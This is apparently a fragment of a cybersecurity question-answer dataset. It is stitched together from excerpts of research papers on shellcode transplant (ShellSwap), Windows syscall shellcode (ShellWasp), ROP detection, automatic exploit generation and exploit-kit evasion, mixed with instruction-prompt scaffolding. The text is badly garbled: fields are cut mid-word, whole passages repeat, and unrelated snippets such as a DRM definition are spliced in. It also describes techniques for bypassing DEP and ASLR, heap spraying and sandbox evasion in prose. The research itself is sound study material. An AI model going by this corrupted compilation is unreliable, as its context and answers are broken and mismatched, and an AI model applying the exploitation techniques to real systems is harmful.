exploits. Our solution to the shellcode transplant problem is based on an functional original exploit, which implies that this exploit has already bypassed the required defense mechanisms. When this is the case, ShellSwap\u2019s replacement exploit often bypasses these mitigation techniques as well. For example, DEP is often bypassed through the use of Return Oriented Programming that chains pieces of code (termed gadgets )i na program to map an executable page (using the Linux mmap or DECREE allocate syscalls), insert shellcode into it, and execute it. Alternatively, the page containing the shellcode (for example, the program stack) can simply be marked executablen\"", "Answer": "[INST] You are an Expert in the field of cybersecurity,                   Leverage the Contextual Information to informed responses.

To speed up the tracing step, ShellSwap enables code JIT\u2019ing (through the use of Unicorn Engine [ 24]) by default, which allows instructions in the original exploit to be executed natively instead of being emulated. While it greatly speed up symbolic tracing, we \ufb01nd that this step is still the bottleneck in ShellSwap: as discussed in Section VI, an average of 95% of execution time is spent in this step. To avoid generating an entire control-\ufb02ow graph in our path kneading component, we used a fast function detection approach to pick out the exact function for which to generate the control \ufb02ow [ 9].

It requires a comprehensive understanding of a vulnerability and delicate techniques to bypass defense mechanisms. As a result, attackers may prefer to reuse an existing exploit and make necessary changes over developing a new exploit from scratch. One such adaptation is the replacement of the original shellcode (i.e., the attacker-injected code that is executed as the \ufb01nal step of the exploit) in the original exploit with a replacement shellcode, resulting in a modi\ufb01ed exploit that carries out the actions desired by the attacker as opposed to the original exploit author. We call this a shellcode transplant. Current automated shellcode placement methods are insuf\ufb01- cient because they over-constrain the replacement shellcode, and so cannot be used to achieve shellcode transplant. For example, these systems consider the shellcode as an integrated memory chunk, and require that the execution path of the modi\ufb01ed exploit must be same as the original one. To resolve these issues, we present ShellSwap, a system that uses symbolic tracing, with a combination of shellcode layout remediation and path kneading to achieve shellcode transplant. We evaluated the ShellSwap system on a combination of 20 exploits and 5 pieces of shellcode that are independently developed and different from the original exploit.

Config file and Customizing Syscalls. Users may supply desired syscalls in the config file, and they also may be provided as input in the command line interface, by typing one per name. When providing them as input, it is case insensitive. It can be desirable at times to have the same syscall used more than once, and ShellWasp supports doing so. To save space and avoid redundancy, however, it will only initialize each once in the syscall array. Thus, if a syscall is used three times in the shellcode, it will only have one element in the syscall array. ShellWasp is intended to be highly flexible, so users can easily rearrange the order of syscalls, using the rear- range feature. It only takes seconds to rearrange the order of syscalls.

The tool itself additionally is an embodiment of a novel technique created by this research to overcome the portability problem with syscall shell- code, and that too can be used outside of the context of the tool; the case studies stand as evidence in support of this. Finally, this research has proposed a newnfor instance, has more than thirteen OS releases. This research provides a methodology to overcome the portability problem associated with shellcode. It also provides a methodology for how to utilize syscalls in shellcode. Finally, this research presents a new tool, ShellWasp, which builds templates of syscall shellcode. ShellWasp utilizes a novel syscall array, which can be populated at runtime with the correct SSNs, allowing syscall shellcode to be able to function across multiple OSs and OS releases. ShellWasp builds the shellcode\u2019s underlying infrastructure, so that it can effectively use the syscall array at runtime, without the need for using hardcoded syscall values. ShellWasp additionally labels all syscall parameters, making it easier for shellcode authors to understand how to construct syscall shellcode. Keywords: Shellcode, Windows syscalls, Reverse Engineering, Offensive Security Windows syscalls in shellcode have only been used on extremely rare occasions, with the singlenprecomputed syscall values, tailored to not every single Windows release in existence, but just the ones that the shellcode authors deem most likely to be used for a specific target, allowing the shellcode to achieve a vastly smaller size, than would otherwise need to be the case. Utilizing the PEB to identify the OS Build in ShellWasp naively was done through happenstance and looking closely at the members of the PEB structure, as described elsewhere here. Regardless, the PEB is how the first SysWhispers identified specific OS builds, though with 64-bit rather than 32-bit code. Once criticism leveled at SysWhispers was that it was too reliant on the syscall tables [4] created by another individual. While ShellWasp actually uses some syscall tables from the same source, we also are not reliant on it, in that we have created our own for new releases and plan to do so for all future OS builds that we decide to support. Moreover, we provide an alternative way to generate these \u2013 one fornIf the heapis randomized, the attacker cannot easily exploits be-cause a jump in that region will raise an invalid memoryerror. The solution is to use an attacking technique thatis known under the name of heap spraying: it means toinject data (NOP + shellcode) in the heap until filling upthe whole assigned space.In this way the memory becomes valid and we canjump safely.Another technique is based on the following observa-tion: ASLR randomizes only part of the addresses in-volved \u2013 e.g. the least significant 2 bytes. An attackerin this way does not require to know the real addressesbut he can use the relative location by using offset val-ues. Of course a feasible method in this scenario is tobruteforce these addresses as well.This technique is often used to exploit vulnerabilitiesin web browser\u2019s components where the code must beable to handle the heap region [2].Data Execution Prevention (DEP)We have to find a smart solution to avoid buffer overflowattacks, or, from another point ofnDECREE allocate syscalls), insert shellcode into it, and execute it.

Downloaded on December 08,2023 at 16:16:34 UTC from IEEE Xplore.  Restrictions apply.bymprotect . For such exploits, ShellSwap bypasses DEP by reusing the original exploit\u2019s DEP bypass and replacing the \ufb01nal mapped shellcode with the replacement shellcode. If the replacement shellcode cannot be located at the same location as the original shellcode, the \ufb01nal control \ufb02ow transfer of the mitigation bypass stage must be modi\ufb01ed to point at the new location. This can be done with the constraint solver as an adaptation of the Path Kneading phase discussed in Section IV. However, in the more general case of DEP bypass (for example, when a pure ROP payload is used, with no mapped shellcode), future work is required to solve the ROP chain transplant problem . Bypassing ASLR is similar. One way to bypass ASLR, in the absence of DEP, is to overwrite the instruction pointer to point to jmp *%reg with a register %reg referring to a register location that currently points to the shellcode. A typical instance of the instruction is jmp *%esp . For the ShellSwap system, the modi\ufb01ed exploit is able to bypass the ASLR protection if 1) the original exploit is able to bypass ASLR and 2) the beginning of the replacement shellcode is placed at the same start address as the shellcode in the original exploit (to which control \ufb02ow is transferred after DEP bypass, for example). In this way, when the program dereferences a function pointer or returns a function, it will jump to the address of the start of the original shellcode, which is also the start of the replacement shellcode, and the modi\ufb01ed exploit will succeed. Again, the \ufb01nal shellcode location can be modi\ufb01ed through an adaptation of the Path Kneading phase.nWe manually post-processed all exploits to make sure each one of them has a piece of shellcode to execute in the end of the exploitation. 3) Shellcode: As shown in Table II, we collected \ufb01ve instances of replacement shellcode from three different sources, four of which are from CGC \ufb01nalists (ForAllSecure and Shellphish), and one of which is manually crafted by ourselves. This range of replacement shellcode instances is important: with the shellcode coming from multiple sources, we can mimic the setting of cyber attack customization in our experiments. We refer to these instances as S1through S5. Therefore, with \ufb01ve instances of replacement shellcode for each of the 20 original exploits in our dataset, we have a total of 100 modi\ufb01ed exploits for ShellSwap to generate. B. Experiment Setup One of the applications of transplanting shellcode is to automatically re\ufb02ect, or ricochet , an attack coming from a rival. In this scenario, the victim \ufb01rst detects an exploit coming from the attacker. They then automatically replace the payload (the shellcode) in the exploit and replay the modi\ufb01ed exploit against the attacker. We try to simulate such a scenario in our experiment, where the attacker emits original exploits and the victim (or replayer/re\ufb02ector) replays a modi\ufb01ed exploit with the shellcode replaced. 1) Machines.: Our experimental setup contains two ma- chines: one machines hosts the DARPA Experimental Cyber Research Evaluation Environment (DECREE), and the other runs ShellSwap. DECREE runs on a virtual machine built using an image provided by DARPA CGC [ 5,6], which offers an isolated environment for running and testing vulnerable programs. It is assigned 1 CPU core and 1 GB of memory on a host machine with Intel Core i7 2.8 GHz. The ShellSwap machine is a standalone server with Intel Xeon E5-2630 v2 as CPU and 96 GB of memory, running Ubuntu 14.04 LTS. 2) Process.: As is shown in Figure 8, the original exploitsn\"wvu  Corelan Bootcamp  Anaheim, CA (USA)  May 2019    So I have been interested in learning exploit development for some time, but never had the motivation to start from scratch on my own by reading blog posts on the Internet.

Finally, we emphasize the novelty of our study. A. Shellcode Analysis Arce [2] was the \ufb01rst to describe the development of shellcode and introduced the working principle and defensive measures of shellcode. Borders et al. [9] proposed Spector. This approach used symbolic execution to extract meaningful API calls and their arguments from shellcode, which can help the users know what the vulnerability is used for. Mason et al. [1] proposed a technique for automatically generating shellcode using natural language generation techniques. Chen et al. [10] designed a new type of shellcode, which is based on JOP (Jump-Oriented Programming) gadgets. Experimental results proved that this new JOP-based shellcode can bypass most existing ROP (Return-Oriented Programming) defenses. Bao et al. [7] designed an automated shellcode porting system ShellSwap for remote exploits. This system is the \ufb01rst end-to- end system, which can modify the observed vulnerabilities and replace thenused purely as an exploit replaying system. 2) Exploit Replayabilty: ShellSwap assumes that the original exploit is deterministically replayable, in the sense that the exploit always succeeds when re-launched against the target. However, this assumption does not always hold. For instance, a vulnerable server may implement a challenge-response protocol that requires the client to send messages with a nonce that the two sides negotiated at the beginning of the session. This nonce would change when we replay the exploit, and the exploit would fail. Asymmetric encryption and sources of randomness from the environment can also manifest in such failures. To generate the modi\ufb01ed exploit for such case, ShellSwap would have to consider an exploit as a state machine rather than a series static bytes, which would require fundamental extensions of the design. This being said, our experiments showed that most of the exploits in our dataset are replayable, and our system is applicable for this majority. We intend to investigate the replaying of non-deterministic exploits in future work. 3) Modern Defense Mechanisms: Modern systems have memory protection mechanisms such as Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP). However, such protection mechanisms can be bypassed by properly-crafted exploits. Our solution to the shellcode transplant problem is based on an functional original exploit, which implies that this exploit has already bypassed the required defense mechanisms. When this is the case, ShellSwap\u2019s replacement exploit often bypasses these mitigation techniques as well. For example, DEP is often bypassed through the use of Return Oriented Programming that chains pieces of code (termed gadgets )i na program to map an executable page (using the Linux mmap or DECREE allocate syscalls), insert shellcode into it, and execute it. Alternatively, the page containing the shellcode (for example, the program stack) can simply be marked executablenwe observed that more than two thirds of them were due to three identical (but located in different addresses, and thus unique) single-instruction ga dgets, each consisting solely of aret instruction. Single-instruction gadgets alone can- not achieve anything useful other than advancing the stack pointer, so we could strengthen the heuristic by requiring the execution of a certain amount of gadgets with at leasttwo or more instructions. Furthermore, the current allowable maximum gadget length of 32 instructions is a quite conservative value, as discussed in Section 3.2, and could be lowered. About one third of the random gadgets in the tested benign inputs wereoverly long, between 1 6\u201332 instructions, and their execu- tion could have been avoided by setting a lower maximum gadget length. 4.2 Detection E\ufb00ectiveness We evaluated the detection effectiveness of ROPscan us- ing a set of eight publicly available ROP exploits against Windows applications. All exploits use a \ufb01rst-stage ROPcode to bypass DEP and execute an embedded second- stage shellcode. Details about the exploits are listed in Table 1. The exploits are available through the Exploit Database [2] using the corresponding EDB-ID, and most of them are also included in Metasploit [3]. We also used four generic ROP payload impleme ntations for bypassing Win- dows DEP [1, 7]. Two of them are based on gadgets from msvcr71.dll , a DLL that is included in (and remains static across) many popular applications [1]. For each exploit, we isolated the attack vector that con- tains the ROP payload, and fed it to ROP scan, which inall cases identi\ufb01ed the beginni ng of the payload correctly. The last two columns in the table correspond to the total number of executed gadgets and the number of unique gad- gets, respectively. When considering the detection heuris- tic used in ROPscan, in the worst case, one of the exploitsagainst Adobe Reader uses just eight gadgets for its ROPn", "Answer": "[INST] You are an Expert in the field of cybersecurity,                   Leverage the Contextual Information to informed responses.                   Contextual Information:                   slimmed set of constraints.B. Optimizations Much of the execution in symbolic tracing does not involve symbolic data. To speed up the tracing step, ShellSwap enables code JIT\u2019ing (through the use of Unicorn Engine [ 24]) by default, which allows instructions in the original exploit to be executed natively instead of being emulated. While it greatly speed up symbolic tracing, we \ufb01nd that this step is still the bottleneck in ShellSwap: as discussed in Section VI, an average of 95% of execution time is spent in this step. To avoid generating an entire control-\ufb02ow graph in our path kneading component, we used a fast function detection approach to pick out the exact function for which to generate the control \ufb02ow [ 9]. In the course of the development of this system, we have upstreamed many big-\ufb01xes and some improvements to angr and its tracing module. With these \ufb01xes, we observed a 1000-times speed improvement on some samples in our evaluation. VI. E V ALUATION In this section, we present our evaluation of ShellSwap. We \ufb01rst describe the data set, including all vulnerable programs andspeed improvement on some samples in our evaluation. VI. E V ALUATION In this section, we present our evaluation of ShellSwap. We \ufb01rst describe the data set, including all vulnerable programs and exploits, used in our evaluation (Section VI-A ). Then, we show the experimental setup in Section VI-B . Next, we demonstrate the effectiveness of our approach in Section VI-C by evaluating both ShellSwap and a reference implementation of previous work on 20 original exploits and 5 pieces of replacement shellcode. There, we show the necessity of ShellSwap in effectively transplanting shellcode. In the end, we evaluate the ef\ufb01ciency of ShellSwap and display the results in Section VI-D . A. Data Set Our evaluation data set contains three parts: 11 vulnerable binaries, 20 original exploits, and 5 pieces of replacement shellcode. We present how the data set is constructed below.nYour Exploit is Mine: Automatic Shellcode Transplant for Remote Exploits Tiffany Bao Carnegie Mellon University tiffanybao@cmu.eduRuoyu Wang UC Santa Barbara \ufb01sh@cs.ucsb.eduYan Shoshitaishvili UC Santa Barbara yans@cs.ucsb.eduDavid Brumley Carnegie Mellon University dbrumley@cmu.edu Abstract \u2014Developing a remote exploit is not easy. It requires a comprehensive understanding of a vulnerability and delicate techniques to bypass defense mechanisms. As a result, attackers may prefer to reuse an existing exploit and make necessary changes over developing a new exploit from scratch. One such adaptation is the replacement of the original shellcode (i.e., the attacker-injected code that is executed as the \ufb01nal step of the exploit) in the original exploit with a replacement shellcode, resulting in a modi\ufb01ed exploit that carries out the actions desired by the attacker as opposed to the original exploit author. We call this a shellcode transplant. Current automated shellcode placement methods are insuf\ufb01- cient because they over-constrain the replacement shellcode, and so cannot be used to achieve shellcode transplant. For example, these systems consider the shellcode as an integrated memory chunk, and require that the execution path of the modi\ufb01ed exploit must be same as the original one. To resolve these issues, we present ShellSwap, a system that uses symbolic tracing, with a combination of shellcode layout remediation and path kneading to achieve shellcode transplant. We evaluated the ShellSwap system on a combination of 20 exploits and 5 pieces of shellcode that are independently developed and different from the original exploit. Among the 100 test cases, our system successfully generated 88% of the exploits. I. I NTRODUCTION Remote exploits are extremely dangerous. With the help of remote exploits against a piece of software running on a victim computer, an attacker can install backdoors and ex\ufb01ltrate sensitive information without physical access to thenThe function proto- types are based on the Hungarian notation used by Microsoft in their official documentation on MSDN. Config file and Customizing Syscalls. Users may supply desired syscalls in the config file, and they also may be provided as input in the command line interface, by typing one per name. When providing them as input, it is case insensitive. It can be desirable at times to have the same syscall used more than once, and ShellWasp supports doing so. To save space and avoid redundancy, however, it will only initialize each once in the syscall array. Thus, if a syscall is used three times in the shellcode, it will only have one element in the syscall array. ShellWasp is intended to be highly flexible, so users can easily rearrange the order of syscalls, using the rear- range feature. It only takes seconds to rearrange the order of syscalls. Similarly, specific Windows releases can quickly be added or removed in seconds. ShellWasp allows users to save their currentnsubsequent functions \u2013 be it WinAPI calls or syscalls. This requires the shellcode author to be aware of where in memory output may appear. With original scientific contributions, it is necessary to provide some validation that shows that the research works well and is effective; in this section, we provide evidence that our research has been validated. Firstly, with Shell- Wasp, the tool, validation is achieved by showing the accuracy and correctness of the shellcode and Assembly it creates.

Such shellcode polymorphism would increase the cases in which ShellSwap can resolve path con\ufb02icts. For example, we could consider building up a dictionary of \u201cinstruction synonyms\u201d, or creating templates to interchangethe cases in which ShellSwap can resolve path con\ufb02icts. For example, we could consider building up a dictionary of \u201cinstruction synonyms\u201d, or creating templates to interchange instructions without changing the semantics. VIII. R ELATED WORK A. Automatic Exploit Generation An exploit is valuable to attackers only when it suits attack- ers\u2019 speci\ufb01c goal. The technique of automatically generating an exploit with a piece of shellcode is called automatic exploit generation (AEG) [ 7,11,20,27]. Those work are mostly based on dynamic symbolic execution. AEG is closely related to ShellSwap in the sense that they both take a vulnerable program and a piece of shellcode and generate a viable exploit. Helaan et al. [ 17] proposed how to place shellcode in memory: scan through the memory and \ufb01nd symbolic memory gaps that are big enough to hold the entire piece of shellcode. For each gap, they try to put shellcode at different offsets by constraining symbolic memory bytes beginning at that offset to the actual bytes of the shellcode. This procedure continues until the shellcode is put in a memory gap or all gaps have been tried. As we have demonstrated in our evaluation, AEG techniques are not suitable for shellcode transplanting, as they lack prin- cipled approach to diagnose and resolve con\ufb02icts imposed bynExploit Generation In 2011, Avgerinos et al. proposed the framework of auto- mated exploit generation (AEG) [25]. It is the \ufb01rst system with complete process of automated vulnerability discovery and exploit generation. It requires source code to be transformed into LLVM bitcode for dynamic binary instrumentation to collect the constraint information during the execution of the program, and then uses constraint solver to generate the exploit. The framework of AEG inspires a lot of other researchers. CRAX [2] proposed by SK Huang et al. and PolyAEG [3] proposed by M Wang et al. can automatically analyze the soft- ware failures and generate attacks with practical mitigation- hardened exploits. CRAX is based on symbolic analyzing platform S2E to collect run-time information, while PolyAEG is based on dynamic instrumentation for taint analysis. With the constraints extracted from run-time information, they can automatically generate exploits in complex situations and can bypass mitigationnmeans that the executor can apply the corresponding exploit models in turns. In the \ufb01rst descriptor, we specify an exploit model hijacked to gets for writing symbolic values to the buffer buf before jumping to system. In exploit generation part, AEG-E will try to \ufb01nd a execution state satisfying the \ufb01rst exploit model. Then, the selected execution state will continue exploring to meet the constraints from the second descriptor on the basis of the \ufb01rst descriptor. If AEG- E succeeds, it can successfully jump to system with the argument /bin/sh to get a shell. The descriptor-3 can follow the descriptor-2 in the same way. D. Exploit Generation This part we explain how to \ufb01nally generate the exploit based on the exploit model. There are two issues to be considered as follows. 1) When to generate: Exploit generation part monitors every execution state in S2E during the crash reproduction.

The primary goal of DRM is to prevent unauthorized use or distribution of protected content, such as music, movies, or software. It uses various mechanisms to restrict playback, copying, and sharing of the content beyond what is permitted by the copyright owner.

{"query": "What model attempts to recover function invocations and other symbols in obfuscated code?", "Context": "\"ease the analysis of a program. This knowledge might be extremely helpful in discarding useless information.\u201d [14] Both tools can identify function calls. They maintain a database of function signatures at the byte level (assembler code). They recover the function by checking each sequence or block of operations in the disassembled code against the signatures in the database. We observe that majority of the previous research work in this \ufb01eld is based on call graph matching which has been designed to be robust to statement interleaving due to com- piled optimization. These approaches are static in nature and try to go beyond the offerings of Ghidra and Hex-rays. Qiuet al. [15], [24] implement a static approach to recover inlined library functions by extracting execution dependence graphs for a library function and then matching this in decompiled code to recover. This work reports deal with inlined functions in optimized binaries, however, the evalua- tion lacks a performance breakdown by optimization level. Furthermore, only precision numbers are reported on a small subset of inlined string library functions, and the overall per- formance is not compared to Ghidra or Hex-Rays. BinShape by Shirani et al. [25] also uses graph features for function identi\ufb01cation. However, they do not assess the ef\ufb01cacy of their approach against inlined functions. \u201cimpact of inlined functions\u201d were not scrutinized. We are the \ufb01rst to attempt this task with a neural model and compare this to the SOTA tools such as Ghidra and HexRays. There have been a couple of neural approaches to recover- ing function names but not inlined functions. He et al. [26] present a tool called Debin that is based on a combination of a decision-tree-based classi\ufb01cation algorithm and a probabi- listic graph model that attempts to recover function invoca- tions and other symbols in obfuscated code. David et al. [27] encode the control \ufb02ow graphs of invocation sites and try tonsage sequences as the deciding features. Subedi et al. [108] employed both static and dynamic analysis of the malware executable to derive static and run-time behavioral features. The model called CRSTATIC uses reverse engineering to extract signatures of the binary. The work proposed by Salehi et al. [109] focuses on detecting bots and DGA-based ran- somware. The authors have utilized behavioral features and calculated the metrics namely, the generation frequency of different domains and the repetition of a particular domain in a given time period. Chen et al. [110] focused on pro- viding ransomware security for Android devices. By collect- ing a large dataset that covers the majority of ransomware families for Android, their proposed system, RansomProber, was able to detect malicious apps with allowable run-time performance and high accuracy. Junaid et al. [111] proposed StateDroid, a two-layer finite state machine model (FSM) to represent the sneaky Android app attacks as state tran- sitions. Jung and Won [98] monitor the read/write activity of ransomware samples and backup files that have a large read/write operation. The context-aware detection model uses entropy information in order to identify abnormal file activity. Almashhandani et al. [100] considered the dynamic analysis of Locky ransomware. An intrusion detection system was developed based on the extracted network traffic features in order to detect the crypto-ransomware family. The authorsdemonstrate how network traffic can be used for early ran- somware detection. Singh et al. [112] developed a detection mechanism based on a set of features such as dynamic link libraries, API calls, registry, and entropy of files. The authors further presented how this context-aware detection method can be integrated into digital forensics for ransomware mitiga- tion and prevention. Almashhadani et al.

NSS labs reported that the average time for a zero day vulnerability to become known to software vendors and users is around 151 days [44] \u2013 providing a significant opportunity for integration and widespread exploitation within a kit.  For these vulnerabilities, which can be sold for up to $1m, the exploit kit is likely to be the fastest route achieving a  return on investment.  \u2022 DNS hijacking  attacks directing users to exploit  kits[45]   \u2022 the use of TOR for communication  between  infected hosts and the command and control  servers[46], [47]  Although the use of dummy functions, manipulating strings,  and obfuscating code with commercially available software are now widely used, kits such as Angler, Nuclear and Rig have further developed their Installation capability.  To avoid deployment on unsuitable platforms or sandboxed  environments which may attract the unwanted attention of threat researchers, they seek first to identify the presence of virtual machines or anti-malware products which could frustrate payload delivery and/or expose operating practices.  Angler will look for the presence of security products (e.g.Angler will look for the presence of security products (e.g.  Kapersky, Trend Micro) and virtual machines (e.g. VMWare, Parallels).  Within the Nuclear kit, this verification happens even before the target is redirected to the exploit kit landing page [46].  Developments have not been constrained only to  Weaponisation and Installation, but have also been observed within Step 3 (Delivery). Although Phishing remains a successful vector for the Exploit kit, Malvertising delivers both targets and ongoing income for the cyber criminal in a perversely ingenious business model:npass memory protections and to enable the execution of a second-level conventional shellcode, which is included inthe same attack vector and thus can be identi\ufb01ed by existing shellcode detectors. However, the embedded shellcode can easily be kept unexposed through a simple packing scheme, and get dynamically decrypted by a tiny ROP-based decryp- tion routine, similarly to simple polymorphic shellcode en- gines. It has also been demonstrated that return-oriented programming can be used to execute arbitrary code [17], and thus future exploits may r ely solely on ROP-based ma- licious code. In any case, the ability to identify the presence of ROP code can increase the detection accuracy of current defenses that rely only on shellcode detection. ROPscan can inspect arbitrary data, which allows its easy integration into existing detectors\u2014we present two case studies in which we have used ROPscan as part of a network-level attack detector and a malicious PDF scanner. 2 Background and Related Work The ability to identify the presence of shellcode in arbi- trary data inputs, such as network traf\ufb01c [12\u201315,18,21,23\u2013 25], process buffers [8,9,22], or memory dumps [18], offers an effective way to detect a broad range of code injection at- tacks. This alleviates the need to take into consideration thespeci\ufb01cs of the exploitation method used, or the actual vul- nerability being exploited\u2014the mere presence of shellcode in a network request, a memory buffer, or a malicious \ufb01ledenotes suspicious activity. Initial shellcode detection approaches used code disas- sembly on network streams to identify the NOP sled [21] or the shellcode itself [12, 23]. Static code analysis though is not effective in the presence of code obfuscation or self- modifying code, techniques that are widely used for shell- code packing and polymorphism. Dynamic code analysis using emulation can effectively handle even highly obfus-cated code, and therefore has been used extensively forn[ 315 ]Searching for the uploadData method definition within the same Java file hasrevealed the following:The app is sending the SMS read from the device to a remote server by invoking thefollowing URL:A step-by-step procedure of how this app is developed was already shown in anearlier section of this chapter.

This can be done by studying the armor and looking for a weak spot that can be used to break it. Same goes for the AV researcher\u2014he needs to figure out what to do to beat armored malware. Code obfuscation, no matter how elegant, can be beaten through reverse engineering. The only enemy is time and effort. The malware writers, not wanting to take the risk, introduced antireversing techniques to slow down or make almost impossible the process of reversing. The most common antireversing techniques for protecting malware at rest are antidecompilers and antidisassemblers. This denies reversers access to the source code of the armored malware to prevent them from figuring out how the armor works and how to beat it.

Code compiled with O0 is the most basic: compilation is fast, and no optimization is done. Starting from O1, more and more optimizations are introduced, and the code structure changes substantially. At Of, the most optimized level, the compiler does not even guar- antee correctness.

In the toy example seen in Fig. 2a, we see that the source code of a \ufb01le is written in C. The function depicted invokes memset and then strcpy (twice). When we compile this \ufb01le with no optimizations (the O0 \ufb02ag) and then decompile it using Ghidra (output seen in Fig. 2b), we see that the decom- piler can recover called functions and can create a generally good representation of the original C code.

This knowledge might be extremely helpful in discarding useless information.\u201d [14] Both tools can identify function calls. They maintain a database of function signatures at the byte level (assembler code). They recover the function by checking each sequence or block of operations in the disassembled code against the signatures in the database. We observe that majority of the previous research work in this \ufb01eld is based on call graph matching which has been designed to be robust to statement interleaving due to com- piled optimization. These approaches are static in nature and try to go beyond the offerings of Ghidra and Hex-rays. Qiuet al. [15], [24] implement a static approach to recover inlined library functions by extracting execution dependence graphs for a library function and then matching this in decompiled code to recover. This work reports deal with inlined functions in optimized binaries, however, the evalua- tion lacks a performance breakdown by optimization level. Furthermore, only precision numbers are reported on a small subset of inlined string library functions, and the overall per- formance is not compared to Ghidra or Hex-Rays. BinShape by Shirani et al. [25] also uses graph features for function identi\ufb01cation. However, they do not assess the ef\ufb01cacy of their approach against inlined functions. \u201cimpact of inlined functions\u201d were not scrutinized. We are the \ufb01rst to attempt this task with a neural model and compare this to the SOTA tools such as Ghidra and HexRays. There have been a couple of neural approaches to recover- ing function names but not inlined functions. He et al. [26] present a tool called Debin that is based on a combination of a decision-tree-based classi\ufb01cation algorithm and a probabi- listic graph model that attempts to recover function invoca- tions and other symbols in obfuscated code. David et al. [27] encode the control \ufb02ow graphs of invocation sites and try tonsage sequences as the deciding features. Subedi et al. [108] employed both static and dynamic analysis of the malware executable to derive static and run-time behavioral features. The model called CRSTATIC uses reverse engineering to extract signatures of the binary. The work proposed by Salehi et al. [109] focuses on detecting bots and DGA-based ran- somware. The authors have utilized behavioral features and calculated the metrics namely, the generation frequency of different domains and the repetition of a particular domain in a given time period. Chen et al. [110] focused on pro- viding ransomware security for Android devices. By collect- ing a large dataset that covers the majority of ransomware families for Android, their proposed system, RansomProber, was able to detect malicious apps with allowable run-time performance and high accuracy. Junaid et al. [111] proposed StateDroid, a two-layer finite state machine model (FSM) to represent the sneaky Android app attacks as state tran- sitions. Jung and Won [98] monitor the read/write activity of ransomware samples and backup files that have a large read/write operation. The context-aware detection model uses entropy information in order to identify abnormal file activity. Almashhandani et al. [100] considered the dynamic analysis of Locky ransomware. An intrusion detection system was developed based on the extracted network traffic features in order to detect the crypto-ransomware family. The authorsdemonstrate how network traffic can be used for early ran- somware detection. Singh et al. [112] developed a detection mechanism based on a set of features such as dynamic link libraries, API calls, registry, and entropy of files. The authors further presented how this context-aware detection method can be integrated into digital forensics for ransomware mitiga- tion and prevention. Almashhadani et al.

NSS labs reported that the average time for a zero day vulnerability to become known to software vendors and users is around 151 days [44] \u2013 providing a significant opportunity for integration and widespread exploitation within a kit.  For these vulnerabilities, which can be sold for up to $1m, the exploit kit is likely to be the fastest route achieving a  return on investment.  \u2022 DNS hijacking  attacks directing users to exploit  kits[45]   \u2022 the use of TOR for communication  between  infected hosts and the command and control  servers[46], [47]  Although the use of dummy functions, manipulating strings,  and obfuscating code with commercially available software are now widely used, kits such as Angler, Nuclear and Rig have further developed their Installation capability.  To avoid deployment on unsuitable platforms or sandboxed  environments which may attract the unwanted attention of threat researchers, they seek first to identify the presence of virtual machines or anti-malware products which could frustrate payload delivery and/or expose operating practices.  Angler will look for the presence of security products (e.g.Angler will look for the presence of security products (e.g.  Kapersky, Trend Micro) and virtual machines (e.g. VMWare, Parallels).  Within the Nuclear kit, this verification happens even before the target is redirected to the exploit kit landing page [46].  Developments have not been constrained only to  Weaponisation and Installation, but have also been observed within Step 3 (Delivery). Although Phishing remains a successful vector for the Exploit kit, Malvertising delivers both targets and ongoing income for the cyber criminal in a perversely ingenious business model:npass memory protections and to enable the execution of a second-level conventional shellcode, which is included inthe same attack vector and thus can be identi\ufb01ed by existing shellcode detectors. However, the embedded shellcode can easily be kept unexposed through a simple packing scheme, and get dynamically decrypted by a tiny ROP-based decryp- tion routine, similarly to simple polymorphic shellcode en- gines. It has also been demonstrated that return-oriented programming can be used to execute arbitrary code [17], and thus future exploits may r ely solely on ROP-based ma- licious code. In any case, the ability to identify the presence of ROP code can increase the detection accuracy of current defenses that rely only on shellcode detection. ROPscan can inspect arbitrary data, which allows its easy integration into existing detectors\u2014we present two case studies in which we have used ROPscan as part of a network-level attack detector and a malicious PDF scanner. 2 Background and Related Work The ability to identify the presence of shellcode in arbi- trary data inputs, such as network traf\ufb01c [12\u201315,18,21,23\u2013 25], process buffers [8,9,22], or memory dumps [18], offers an effective way to detect a broad range of code injection at- tacks. This alleviates the need to take into consideration thespeci\ufb01cs of the exploitation method used, or the actual vul- nerability being exploited\u2014the mere presence of shellcode in a network request, a memory buffer, or a malicious \ufb01ledenotes suspicious activity. Initial shellcode detection approaches used code disas- sembly on network streams to identify the NOP sled [21] or the shellcode itself [12, 23]. Static code analysis though is not effective in the presence of code obfuscation or self- modifying code, techniques that are widely used for shell- code packing and polymorphism. Dynamic code analysis using emulation can effectively handle even highly obfus-cated code, and therefore has been used extensively forn[ 315 ]Searching for the uploadData method definition within the same Java file hasrevealed the following:The app is sending the SMS read from the device to a remote server by invoking thefollowing URL:A step-by-step procedure of how this app is developed was already shown in anearlier section of this chapter.

This can be done by studying the armor and looking for a weak spot that can be used to break it. Same goes for the AV researcher\u2014he needs to figure out what to do to beat armored malware. Code obfuscation, no matter how elegant, can be beaten through reverse engineering. The only enemy is time and effort. The malware writers, not wanting to take the risk, introduced antireversing techniques to slow down or make almost impossible the process of reversing. The most common antireversing techniques for protecting malware at rest are antidecompilers and antidisassemblers. This denies reversers access to the source code of the armored malware to prevent them from figuring out how the armor works and how to beat it. The drawback of this technology is that itnlistic graph model that attempts to recover function invoca- tions and other symbols in obfuscated code. David et al.

At Of, the most optimized level, the compiler does not even guar- antee correctness.

[19] and Schultz et al. [4] argue that identi- fying library function calls made within a binary are key to comprehending its behavior. Substantial prior research in the \ufb01eld of binary analysis has focused on this problem. Much of the effort to understand binaries is to identify malware. Schultz et al.

Inlined calls transitively inlined in the function under consideration might be recovered by all three tools; however, we have no way of knowing whether the recovery is a true positive. We do look at this transitive inlining for one step i.e., for the \ufb01rst function declaration inside the same \ufb01le that is inlined. However, we do not con- struct a system-level call graph which might adversely impact the false positive rate reported for all three tools. Practical Applicability. When both Ghidra and Hex-rays recover a function call, they can place it in the function de\ufb01ni- tion body as an actual function call and not a collection of statements. F UNCRE can only recover the list of inlined func- tions per function declaration body. However, as seen in Sec- tion 5.4 we observe that both Ghidra and Hex-rays have false positives when it comes to function recovery, furthermore, the evaluation strategy employed in this work does not know whether the location where the function is recovered is correct or whether the parameters that are passed to the function call are correct. We do recover some functions that current tools cannot; still, marking the exact position of the inlined is func- tion is much harder because the compilation-decompilation loop can move the location of a marker. Knowing exactly which lines correspond to an inlined function is also non-triv- ial without a more advanced representation of the code. 7C ONTRIBUTIONS We have described an approach to improve inlined library function recovery in comparison with state-of-the-art tools (Ghidra and Hex-rays IDA Pro).

